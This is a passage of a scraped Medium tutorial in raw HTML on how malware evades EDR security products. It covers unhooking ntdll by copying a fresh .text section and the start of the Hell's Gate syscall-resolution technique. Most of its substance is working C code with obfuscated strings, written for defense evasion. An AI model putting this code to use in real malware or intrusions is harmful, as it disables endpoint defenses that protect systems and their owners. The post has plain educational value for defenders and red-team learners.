(-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb qa c" width="700" height="212" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/0*vW_p2wVPA0O-jItN.png"></picture></div></div></figure></div></div></div><div class="ac ci ow ox oy oz" role="separator"><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="6fa2" class="mu mv hl bg mw mx qb mz na nb qc nd ne nf qd nh ni nj qe nl nm nn qf np nq nr bl" data-selectable-paragraph="">Unhooking Techniques:</h2><p id="2b2a" class="pw-post-body-paragraph ns nt hl nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op he bl" data-selectable-paragraph="">Let’s see now how to see the hook bytes and how to unhook, First let’s see how the malware have been hooked by the EDR</p><ol class=""><li id="26e4" class="ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op qg qh qi bl" data-selectable-paragraph="">Open x64 dbg</li><li id="6cc9" class="ns nt hl nu b nv qj nx ny nz qk ob oc od ql of og oh qm oj ok ol qn on oo op qg qh qi bl" data-selectable-paragraph="">Run your malware or any program and attach it</li><li id="d6e5" class="ns nt hl nu b nv qj nx ny nz qk ob oc od ql of og oh qm oj ok ol qn on oo op qg qh qi bl" data-selectable-paragraph="">Go to Symbols section then go to the ntdll.dll part</li><li id="0d9b" class="ns nt hl nu b nv qj nx ny nz qk ob oc od ql of og oh qm oj ok ol qn on oo op qg qh qi bl" data-selectable-paragraph="">Search for NtAdjustPrivilegesToken and click it.</li></ol><figure class="pq pr ps pt pu pv pn po paragraph-image"><div role="button" tabindex="0" class="pw px fr py bi pz"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pn po qo"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*vAqDkrHuhvsZ0L9w86msxg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*vAqDkrHuhvsZ0L9w86msxg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*vAqDkrHuhvsZ0L9w86msxg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*vAqDkrHuhvsZ0L9w86msxg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*vAqDkrHuhvsZ0L9w86msxg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*vAqDkrHuhvsZ0L9w86msxg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vAqDkrHuhvsZ0L9w86msxg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*vAqDkrHuhvsZ0L9w86msxg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*vAqDkrHuhvsZ0L9w86msxg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*vAqDkrHuhvsZ0L9w86msxg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*vAqDkrHuhvsZ0L9w86msxg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*vAqDkrHuhvsZ0L9w86msxg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*vAqDkrHuhvsZ0L9w86msxg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*vAqDkrHuhvsZ0L9w86msxg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb qa c" width="700" height="396" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*vAqDkrHuhvsZ0L9w86msxg.png"></picture></div></div></figure><p id="28cf" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">And now it’s jmp instruction It’s hooked!, so in real scinarios malwares remove this instruction, and like we said that there are many techniques so what are the techniques for unhooking?</p><ol class=""><li id="6ec3" class="ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op qg qh qi bl" data-selectable-paragraph="">Unhook by fresh ntdll copy. This is a very famous technique used by hackers and malware authors, the hacker starts to parse the ntdll to find the .text section</li></ol><figure class="pq pr ps pt pu pv pn po paragraph-image"><div role="button" tabindex="0" class="pw px fr py bi pz"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pn po qp"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*peChmLHBixZQX77_.jpg 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*peChmLHBixZQX77_.jpg 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*peChmLHBixZQX77_.jpg 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*peChmLHBixZQX77_.jpg 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*peChmLHBixZQX77_.jpg 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*peChmLHBixZQX77_.jpg 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*peChmLHBixZQX77_.jpg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*peChmLHBixZQX77_.jpg 640w, https://miro.medium.com/v2/resize:fit:720/0*peChmLHBixZQX77_.jpg 720w, https://miro.medium.com/v2/resize:fit:750/0*peChmLHBixZQX77_.jpg 750w, https://miro.medium.com/v2/resize:fit:786/0*peChmLHBixZQX77_.jpg 786w, https://miro.medium.com/v2/resize:fit:828/0*peChmLHBixZQX77_.jpg 828w, https://miro.medium.com/v2/resize:fit:1100/0*peChmLHBixZQX77_.jpg 1100w, https://miro.medium.com/v2/resize:fit:1400/0*peChmLHBixZQX77_.jpg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb qa c" width="700" height="522" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/0*peChmLHBixZQX77_.jpg"></picture></div></div></figure><p id="18a9" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Then we copy fresh .text section into ntdll memory and let’s see the function code</p><pre class="pq pr ps pt pu qq qr qs bq qt bc bl"><span id="b11f" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph=""><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title.function">UnhookNtdll</span><span class="hljs-params">(<span class="hljs-type">const</span> HMODULE hNtdll, <span class="hljs-type">const</span> LPVOID pMapping)</span> {<br><span class="hljs-comment">/*<br>    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one<br>*/</span><br> DWORD oldprotect = <span class="hljs-number">0</span>;<br> PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;<br> PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead-&gt;e_lfanew);<br> <span class="hljs-type">int</span> i;<br><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sVirtualProtect[] = { <span class="hljs-string">'V'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'r'</span>,<span class="hljs-string">'t'</span>,<span class="hljs-string">'u'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'l'</span>,<span class="hljs-string">'P'</span>,<span class="hljs-string">'r'</span>,<span class="hljs-string">'o'</span>,<span class="hljs-string">'t'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'c'</span>,<span class="hljs-string">'t'</span>, <span class="hljs-number">0x0</span> };<br> <br> VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);<br> <br> <span class="hljs-comment">// find .text section</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pImgNTHead-&gt;FileHeader.NumberOfSections; i++) {<br>  PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + <br>            ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *) pImgSectionHead-&gt;Name, <span class="hljs-string">".text"</span>)) {<br>   <span class="hljs-comment">// prepare ntdll.dll memory region for write permissions.</span><br>   VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead-&gt;VirtualAddress),<br>       pImgSectionHead-&gt;Misc.VirtualSize,<br>       PAGE_EXECUTE_READWRITE,<br>       &amp;oldprotect);<br>   <span class="hljs-keyword">if</span> (!oldprotect) {<br>     <span class="hljs-comment">// RWX failed!</span><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>   }<br>   <span class="hljs-comment">// copy fresh .text section into ntdll memory</span><br>   <span class="hljs-built_in">memcpy</span>( (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead-&gt;VirtualAddress),<br>     (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead-&gt;VirtualAddress),<br>     pImgSectionHead-&gt;Misc.VirtualSize);<br><br>   <span class="hljs-comment">// restore original protection settings of ntdll memory</span><br>   VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead-&gt;VirtualAddress),<br>       pImgSectionHead-&gt;Misc.VirtualSize,<br>       oldprotect,<br>       &amp;oldprotect);<br>   <span class="hljs-keyword">if</span> (!oldprotect) {<br>     <span class="hljs-comment">// it failed</span><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>   }<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  }<br> }<br><br> <span class="hljs-comment">// failed? .text not found!</span><br> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>}</span></pre><pre class="qz qq qr qs bq qt bc bl"><span id="3822" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph=""><span class="hljs-type">int</span> <span class="hljs-title.function">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> {<br>    <br> <span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>    HANDLE hProc = <span class="hljs-literal">NULL</span>;<br><br> <span class="hljs-comment">//unsigned char sNtdllPath[] = "c:\\windows\\system32\\";</span><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sNtdllPath[] = { <span class="hljs-number">0x59</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3a</span> };<br><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sCreateFileMappingA[] = { <span class="hljs-string">'C'</span>,<span class="hljs-string">'r'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'t'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'F'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'l'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'M'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'p'</span>,<span class="hljs-string">'p'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'n'</span>,<span class="hljs-string">'g'</span>,<span class="hljs-string">'A'</span>, <span class="hljs-number">0x0</span> };<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sMapViewOfFile[] = { <span class="hljs-string">'M'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'p'</span>,<span class="hljs-string">'V'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'w'</span>,<span class="hljs-string">'O'</span>,<span class="hljs-string">'f'</span>,<span class="hljs-string">'F'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'l'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-number">0x0</span> };<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sUnmapViewOfFile[] = { <span class="hljs-string">'U'</span>,<span class="hljs-string">'n'</span>,<span class="hljs-string">'m'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'p'</span>,<span class="hljs-string">'V'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'e'</span>,<span class="hljs-string">'w'</span>,<span class="hljs-string">'O'</span>,<span class="hljs-string">'f'</span>,<span class="hljs-string">'F'</span>,<span class="hljs-string">'i'</span>,<span class="hljs-string">'l'</span>,<span class="hljs-string">'e'</span>, <span class="hljs-number">0x0</span> };<br><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sNtdllPath_len = <span class="hljs-keyword">sizeof</span>(sNtdllPath);<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sNtdll_len = <span class="hljs-keyword">sizeof</span>(sNtdll);<br> <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br> HANDLE hFile;<br> HANDLE hFileMapping;<br> LPVOID pMapping;<br> <br> <span class="hljs-comment">// get function pointers</span><br> CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);<br> MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);<br> UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);<br> <br> <span class="hljs-comment">// open ntdll.dll</span><br> XORcrypt((<span class="hljs-type">char</span> *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - <span class="hljs-number">1</span>]);<br> hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> ( hFile == INVALID_HANDLE_VALUE ) {<br>   <span class="hljs-comment">// failed to open ntdll.dll</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br> }<br><br> <span class="hljs-comment">// prepare file mapping</span><br> hFileMapping = CreateFileMappingA_p(hFile, <span class="hljs-literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> (! hFileMapping) {<br>   <span class="hljs-comment">// file mapping failed</span><br>   CloseHandle(hFile);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br> }<br> <br> <span class="hljs-comment">// map the bastard</span><br> pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br> <span class="hljs-keyword">if</span> (!pMapping) {<br>     <span class="hljs-comment">// mapping failed</span><br>     CloseHandle(hFileMapping);<br>     CloseHandle(hFile);<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br> }<br> <br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Check 1!\n"</span>); getchar(); <br> <br> <span class="hljs-comment">// remove hooks</span><br> ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);<br><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Check 2!\n"</span>); getchar(); <br><br> <span class="hljs-comment">// Clean up.</span><br> UnmapViewOfFile_p(pMapping);<br> CloseHandle(hFileMapping);<br> CloseHandle(hFile);<br><br>}</span></pre><p id="271a" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">The code is very easy we only remove any hooks or modifications applied to the <code class="de ra rb rc qr b">.text</code> segment of the <code class="de ra rb rc qr b">ntdll.dll</code> module, ensuring that the original code is restored and then in the end we close the handles. Let’s see now in the debugger.</p><figure class="pq pr ps pt pu pv pn po paragraph-image"><div role="button" tabindex="0" class="pw px fr py bi pz"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pn po rd"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*J4ZzkxvLtJCeezmHXuWIBw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*J4ZzkxvLtJCeezmHXuWIBw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*J4ZzkxvLtJCeezmHXuWIBw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*J4ZzkxvLtJCeezmHXuWIBw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*J4ZzkxvLtJCeezmHXuWIBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*J4ZzkxvLtJCeezmHXuWIBw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J4ZzkxvLtJCeezmHXuWIBw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*J4ZzkxvLtJCeezmHXuWIBw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*J4ZzkxvLtJCeezmHXuWIBw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*J4ZzkxvLtJCeezmHXuWIBw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*J4ZzkxvLtJCeezmHXuWIBw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*J4ZzkxvLtJCeezmHXuWIBw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*J4ZzkxvLtJCeezmHXuWIBw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*J4ZzkxvLtJCeezmHXuWIBw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb qa c" width="700" height="394" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*J4ZzkxvLtJCeezmHXuWIBw.png"></picture></div></div><figcaption class="re fm rf pn po rg rh bg b bh ab eb" data-selectable-paragraph="">Now it removed ^_^</figcaption></figure></div></div></div><div class="ac ci ow ox oy oz" role="separator"><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="dee0" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">The second unhooking technique is called “Hells Gate.” Initially, understanding this technique may seem a bit challenging, but it is actually quite straightforward and fascinating. Let’s delve into how it works.</p><div class="vf ud vg vh ac r cv"><div class="vi vj vk vl vm m fm"><h2 class="vn b vo vp vq vr vs">Get Hossam Ehab’s stories in&nbsp;your&nbsp;inbox</h2></div><div class="cs m fm"><p class="bg b bh ab eb">Join Medium for free to get updates from&nbsp;this&nbsp;writer.</p></div><div class="vw sh vx vy sg vz ac"><span class="bg b bh ab bl"><div class="wa ac cv"><div class="ac wa fj fi bq wb wc de lp wd we wf wg wh wi wj"><input class="wk al aj an wl wm gd lb bm wn bi" placeholder="Enter your email" type="text" value=""></div></div></span><div class="i l sx cb"><div class="vt vu vv"><button class="bg b bh ab wo rn wp wq wr ws um fc fd wt wu wv fh fi fj fk bn fl fm">Subscribe</button></div></div><div class="bi k j e"><button class="bg b bh ab wo rn wp wq wr ws um fc fd wt wu wv fh bi fi fj fk bn fl fm">Subscribe</button></div></div><div class="rl m"><div id="g-recaptcha"></div></div></div><p id="735c" class="pw-post-body-paragraph ns nt hl nu b nv nx ny nz ob oc od of og oh oj ok ol on oo vh op he bl" data-selectable-paragraph="">First, we need to obtain the hash for the function we are interested in. For instance, let’s consider the function NTAllocateVirtualMemory, which has a hash value of 0xf5bd373480a6b89b. Once we have the hash, we attempt to allocate it in ntdll.</p><p id="0ce9" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">In the Hells Gate technique, we search for specific instructions. If we successfully locate these instructions, it indicates that the function has been hooked. This step involves matching the hashes and identifying the relevant instructions. Finally, I will provide the complete code for this process.</p><pre class="pq pr ps pt pu qq qr qs bq qt bc bl"><span id="d87d" class="qu mv hl qr b bh qv qw m qx qy" data-selectable-paragraph="">BOOL <span class="hljs-title.function">GetVxTableEntry</span><span class="hljs-params">(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry)</span> {<br> PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);<br> PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);<br> PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);<br><br> <span class="hljs-keyword">for</span> (WORD cx = <span class="hljs-number">0</span>; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {<br>  PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);<br>  PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];<br><br>  <span class="hljs-keyword">if</span> (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {<br>   pVxTableEntry-&gt;pAddress = pFunctionAddress;<br><br>   <span class="hljs-comment">// Quick and dirty fix in case the function has been hooked</span><br>   WORD cw = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">while</span> (TRUE) {<br>    <span class="hljs-comment">// check if syscall, in this case we are too far</span><br>    <span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + cw) == <span class="hljs-number">0x0f</span> &amp;&amp; *((PBYTE)pFunctionAddress + cw + <span class="hljs-number">1</span>) == <span class="hljs-number">0x05</span>)<br>     <span class="hljs-keyword">return</span> FALSE;<br><br>    <span class="hljs-comment">// check if ret, in this case we are also probaly too far</span><br>    <span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + cw) == <span class="hljs-number">0xc3</span>)<br>     <span class="hljs-keyword">return</span> FALSE;<br><br>    <span class="hljs-comment">// First opcodes should be :</span><br>    <span class="hljs-comment">//    MOV R10, RCX</span><br>    <span class="hljs-comment">//    MOV RCX, &lt;syscall&gt;</span><br>    <span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + cw) == <span class="hljs-number">0x4c</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">1</span> + cw) == <span class="hljs-number">0x8b</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">2</span> + cw) == <span class="hljs-number">0xd1</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">3</span> + cw) == <span class="hljs-number">0xb8</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">6</span> + cw) == <span class="hljs-number">0x00</span><br>     &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">7</span> + cw) == <span class="hljs-number">0x00</span>) {<br>     BYTE high = *((PBYTE)pFunctionAddress + <span class="hljs-number">5</span> + cw);<br>     BYTE low = *((PBYTE)pFunctionAddress + <span class="hljs-number">4</span> + cw);<br>     pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; <span class="hljs-number">8</span>) | low;<br>     <span class="hljs-keyword">break</span>;<br>    }<br><br>    cw++;<br>   };<br>  }<br> }<br><br> <span class="hljs-keyword">return</span> TRUE;<br>}</span></pre><p id="30c6" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">This is the instructions that we finding it</p><p id="caca" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">MOV R10, RCX<br> MOV RCX, &lt;syscall&gt;</p><p id="c49f" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">In this image :</p><figure class="pq pr ps pt pu pv pn po paragraph-image"><div role="button" tabindex="0" class="pw px fr py bi pz"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pn po ri"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*8I02SWEiggT65s3-rgjy_w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*8I02SWEiggT65s3-rgjy_w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*8I02SWEiggT65s3-rgjy_w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*8I02SWEiggT65s3-rgjy_w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*8I02SWEiggT65s3-rgjy_w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*8I02SWEiggT65s3-rgjy_w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8I02SWEiggT65s3-rgjy_w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 